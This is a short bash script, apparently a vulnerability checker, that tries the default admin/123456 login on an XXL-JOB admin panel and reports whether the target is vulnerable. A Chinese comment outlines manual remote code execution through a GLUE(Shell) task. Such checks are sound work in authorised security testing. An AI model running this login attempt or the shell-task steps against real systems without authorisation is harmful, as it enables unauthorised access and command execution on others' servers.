#!/usr/bin/env bash
TARGET="${1:?usage: bash xxljob.sh http://TARGET:8080 [base]}"
B="${2:-${TARGET%/}/xxl-job-admin}"
rm -f runs/xxl.ck
code=$(curl -sS -m 12 -c runs/xxl.ck -o runs/xxl-login.json -w '%{http_code}' \
  -X POST "$B/login" -d 'userName=admin&password=123456')
echo "login http=$code"; head -c 200 runs/xxl-login.json; echo
grep -q 'XXL_JOB_LOGIN_IDENTITY' runs/xxl.ck 2>/dev/null && echo "VULN 默认口令可用" || echo "SAFE 需其他口令"
# 利用（手工，GUI 更稳）：任务管理 → 新增 → 运行模式 GLUE(Shell) → 脚本 id → 执行一次 → 看调度日志
